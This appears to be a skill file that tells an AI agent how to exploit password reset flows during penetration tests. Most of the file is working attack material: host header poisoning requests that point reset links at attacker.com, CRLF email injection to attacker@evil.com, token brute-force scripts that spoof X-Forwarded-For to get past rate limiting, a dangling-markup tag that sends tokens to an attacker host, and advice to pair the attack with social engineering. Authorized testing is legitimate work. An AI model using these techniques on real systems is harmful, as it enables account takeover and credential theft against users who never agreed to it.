---
name: password-reset-poisoning
description: >
  Exploit password reset vulnerabilities during authorized penetration
  testing.
keywords:
  - password reset poisoning
  - password reset bypass
  - forgot password bypass
  - reset token theft
  - host header poisoning
  - password reset token
  - account recovery bypass
  - reset link manipulation
  - password reset email injection
  - token prediction
  - reset token leakage
tools:
  - burpsuite
  - curl
  - ffuf
opsec: low
---

# Password Reset Poisoning

You are helping a penetration tester exploit password reset vulnerabilities.
The target application has a password reset flow (forgot password → email →
reset link) that may be vulnerable to token theft, host header manipulation,
email injection, or weak token generation. The goal is to intercept or predict
reset tokens to achieve account takeover. All testing is under explicit written
authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[password-reset-poisoning] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- A password reset endpoint (`/forgot-password`, `/reset-password`,
  `/account/recovery`)
- A test account (to receive and analyze legitimate reset emails)
- Burp Suite (to intercept and modify reset requests)
- An attacker-controlled server or Burp Collaborator (to capture redirected
  tokens)

## Step 1: Assess

Map the password reset flow.

### Capture the Reset Flow

1. Request a password reset for your test account
2. Intercept the request in Burp
3. Receive the reset email — analyze the link structure
4. Note the token format, length, and character set

### Identify the Reset Link Structure

```
https://target.com/reset?token=abc123def456
https://target.com/reset/abc123def456
https://target.com/reset?token=abc123&email=user@target.com
```

Key questions:
- Where does the domain in the link come from? (Host header? Config?)
- Is the token in a query parameter or URL path?
- Does the email contain any user-controllable content?
- Is there a separate verify endpoint?

## Step 2: Host Header Poisoning

The most common password reset vulnerability — the application uses the Host
header to generate the reset link URL.

### Basic Host Override

```bash
# Replace Host header with attacker domain
POST /reset-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

If the victim receives: `https://attacker.com/reset?token=TOKEN` — the
attacker captures the token when the victim clicks the link.

### X-Forwarded-Host Override

```bash
# Keep original Host, add X-Forwarded-Host
POST /reset-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

### All Host Override Headers

Test each of these — different frameworks honor different headers:

```http
X-Forwarded-Host: attacker.com
X-Original-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Host: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
```

### Double Host Header

```http
Host: target.com
Host: attacker.com
```

Some load balancers pass the first, some the last. The application may use a
different one than the proxy validated.

### Host Header with Port

```http
Host: target.com:@attacker.com
Host: target.com#@attacker.com
Host: attacker.com/target.com
```

### Absolute URL Override

```http
POST https://target.com/reset-password HTTP/1.1
Host: attacker.com
```

When the request line contains an absolute URL, some servers use the Host
header for link generation instead of the URL.

## Step 3: Token Leakage via Referer

If the reset page loads external resources, the token leaks in the Referer
header.

### Test for Referer Leakage

1. Request a password reset for your test account
2. Click the reset link (don't complete the reset)
3. On the reset page, click any external link or load an external resource
4. Check if the Referer header sent to the external site contains the token

```bash
# Check what external resources the reset page loads
curl -s "https://target.com/reset?token=TEST" | \
  grep -oP 'src="https?://[^"]*"' | grep -v "target.com"
```

### Exploit

If the reset page loads resources from a domain you control (CDN, analytics,
social widget), the token arrives in your server logs via the Referer header.

If not, chain with an open redirect or XSS on the reset page to force
navigation to your server.

## Step 4: Email Parameter Injection

Manipulate the email parameter to receive the reset token at an
attacker-controlled address.

### Parameter Duplication

```bash
# Two email parameters — some backends send to both
email=victim@target.com&email=attacker@evil.com
```

### Carbon Copy Injection (CRLF)

```bash
# Inject Cc/Bcc headers via CRLF
email=victim@target.com%0a%0dcc:attacker@evil.com
email=victim@target.com%0a%0dbcc:attacker@evil.com
email=victim@target.com%0d%0acc:attacker@evil.com
```

### Separator Injection

```bash
# Various separators that may be parsed as multiple addresses
email=victim@target.com,attacker@evil.com
email=victim@target.com%20attacker@evil.com
email=victim@target.com|attacker@evil.com
```

### JSON Array

```json
{"email": ["victim@target.com", "attacker@evil.com"]}
```

### Subdomain Email Trick

```bash
# Some validators accept subaddressing
email=victim@target.com@attacker.com
email=victim+attacker@target.com
```

## Step 5: Token Weakness Analysis

Analyze the token for predictability or reuse.

### Collect Tokens

Request 20+ reset tokens for your test account and compare:

```bash
# Request multiple tokens and collect them
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/reset-password" \
    -d "email=testuser@target.com" > /dev/null
  sleep 1
done
# Check email for tokens
```

### Analyze Token Entropy

Use Burp Sequencer: right-click the reset request → Send to Sequencer →
select the token → Start live capture.

Look for:
- **Sequential patterns** (incrementing numbers)
- **Timestamp components** (tokens generated close in time are similar)
- **Low entropy** (short tokens, limited character set)
- **Consistent prefix/suffix** (shared components across tokens)

### Common Weak Token Patterns

| Pattern | Example | Exploitable? |
|---------|---------|-------------|
| Numeric sequential | `1001`, `1002`, `1003` | Trivially predictable |
| Timestamp-based | `base64(userid + timestamp)` | Predictable with narrow window |
| MD5 of email | `md5(victim@target.com)` | Static — compute once, reuse forever |
| MD5 of user ID | `md5(123)` | Enumerable |
| UUID v1 | `95f6e264-bb00-11ec-...` | Timestamp + machine — partially predictable |
| Short random | `a3f8` (4 chars) | Brute-forceable |

### Token Reuse

```bash
# Request reset, capture token T1
# Request reset again — does T1 still work?
# Use T1 to reset password — does T1 work again after use?

curl -s -X POST "https://target.com/reset-confirm" \
  -d "token=T1&password=NewPass123"
# If 200 OK → token reusable (should be single-use)
```

### Token Expiration

```bash
# Request reset, wait various intervals, try token
# Tokens should expire within 15-60 minutes

# Wait 2 hours
sleep 7200
curl -s -X POST "https://target.com/reset-confirm" \
  -d "token=OLD_TOKEN&password=NewPass123"
# If accepted → token lifetime too long
```

## Step 6: Token Brute-Force

If tokens are short or have limited character sets, brute-force them.

### Short Numeric Token

```bash
# 4-digit numeric token (10,000 combinations)
ffuf -u "https://TARGET/reset-confirm" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=FUZZ&password=NewPass123" \
  -w <(seq -w 0000 9999) \
  -mc 200,302 \
  -rate 50
```

### Python Brute-Force with Rate Limit Bypass

```python
import requests
import random

url = "https://TARGET/reset-confirm"
target_email = "victim@target.com"

for token in range(10000):
    headers = {
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }
    data = {
        "token": f"{token:04d}",
        "email": target_email,
        "password": "NewPass123!"
    }
    r = requests.post(url, data=data, headers=headers)
    if r.status_code == 200 and "success" in r.text.lower():
        print(f"[+] Valid token: {token:04d}")
        break
```

## Step 7: Response Manipulation

Test if the reset flow relies on client-side validation.

### Status Code Manipulation

Intercept the response in Burp and change:
- `403 Forbidden` → `200 OK`
- `{"success": false}` → `{"success": true}`
- `{"error": "Invalid token"}` → `{"error": ""}`

If the application only checks the response status/body client-side and
doesn't validate server-side, the password change may succeed.

### Redirect Manipulation

If the reset flow redirects on success:
- Capture the error redirect
- Change `Location: /reset?error=invalid` to `Location: /dashboard`

## Step 8: Username/Email Enumeration

The reset endpoint often leaks whether an account exists.

### Differential Response

```bash
# Valid account
curl -s -X POST "https://TARGET/reset-password" \
  -d "email=admin@target.com" -o /dev/null -w "%{http_code} %{size_download}"

# Invalid account
curl -s -X POST "https://TARGET/reset-password" \
  -d "email=nonexist@target.com" -o /dev/null -w "%{http_code} %{size_download}"

# Compare: status code, response size, response time, error message
```

### Timing-Based Enumeration

```bash
# Valid email triggers DB lookup + email send (slower)
# Invalid email returns immediately (faster)
for email in admin root user test; do
  echo -n "${email}@target.com: "
  curl -s -X POST "https://TARGET/reset-password" \
    -d "email=${email}@target.com" \
    -o /dev/null -w "%{time_total}s\n"
done
```

## Step 9: Advanced Techniques

### Dangling Markup in Reset Emails

If user-controllable content appears in the reset email (username, display
name), inject HTML to exfiltrate the token:

```html
<!-- Inject into username/display name field -->
<img src='https://attacker.com/steal?token=

<!-- The token following this tag in the email gets sent as the img src -->
```

### Unicode Normalization

```bash
# Register with unicode variant of victim's email
# vićtim@gmail.com normalizes to victim@gmail.com on some platforms

# If the app normalizes after lookup but before sending:
# Reset request for vićtim@gmail.com → sent to victim@gmail.com
# But token is associated with attacker's account
```

### Password Reset Disables 2FA

```bash
# Complete a password reset flow
# Check if 2FA is still enforced on next login
# If 2FA is disabled after reset → chain with host header poisoning
# for full account takeover bypassing 2FA
```

### Session Persistence After Reset

```bash
# Capture victim's session cookie (via XSS, MITM, etc.)
# Victim resets their password
# Try the old session — does it still work?

curl -s -H "Cookie: session=OLD_SESSION_COOKIE" \
  "https://TARGET/account"
# If 200 OK → sessions not invalidated on password reset
```

## Step 10: Escalate or Pivot

After confirming password reset vulnerabilities:

- **Host header poisoning confirmed**: Capture victim's reset token when they
  click the link. Reset their password. Full account takeover.
- **Token predictable or brute-forceable**: Generate/guess valid tokens
  without victim interaction. Silent account takeover.
- **Email injection confirmed**: Receive reset tokens for any account.
  Mass account takeover potential.
- **Reset disables 2FA**: Chain with any token theft technique to bypass
  2FA. Escalate for documentation.
- **Username enumeration confirmed**: Build valid user list. Route to
  credential attacks or **oauth-attacks** for targeted exploitation.
- **Weak tokens + CORS misconfiguration**: Route to
  **cors-misconfiguration** to exfiltrate tokens cross-origin.
- **XSS on reset page**: Escalate or **xss-dom** to
  steal tokens from the reset page.

Report in your return summary: any new credentials, access, vulns, or pivot
paths discovered.

When routing, pass along: confirmed technique, token format, affected endpoint,
and impact assessment.

## OPSEC Notes

- Password reset requests are normal application behavior — low detection risk
- Host header manipulation may trigger WAF rules on unusual Host values
- Email parameter injection (CRLF) may be logged by email gateway
- Token brute-force generates many requests — use rate limiting in scripts
- Successful password reset changes the victim's password — they will know
  (use this as a last step or coordinate with client)

## Troubleshooting

### Host Header Ignored

- Try all override headers (X-Forwarded-Host, X-Original-Host, Forwarded, etc.)
- Try double Host header
- Try absolute URL in the request line
- Check if the domain is hardcoded in application config (not exploitable)

### Email Parameter Injection Blocked

- Try different encodings: double URL encoding, Unicode
- Try JSON format if the endpoint accepts it
- Try different separators: comma, pipe, space, semicolon
- Check if the backend uses `sendmail` (parameter injection possible)

### Tokens Are Long and Random

- 32+ character random tokens are not brute-forceable
- Focus on: host header poisoning, Referer leakage, email injection
- Check if multiple reset requests invalidate previous tokens
- Test token expiration (long-lived tokens increase attack window)

### Rate Limiting on Reset Endpoint

- Try IP rotation via X-Forwarded-For
- Try session rotation (new session per batch of attempts)
- Use HTTP/2 multiplexing for parallel requests
- Slow down requests to stay under the threshold

### Victim Must Click the Link (Host Poisoning)

- This is inherent to the technique — the victim must click
- Increase success by: using a convincing domain, timing the attack when
  the victim expects a reset, or chaining with social engineering
- If click-free exploitation is needed, focus on token prediction or
  email injection instead
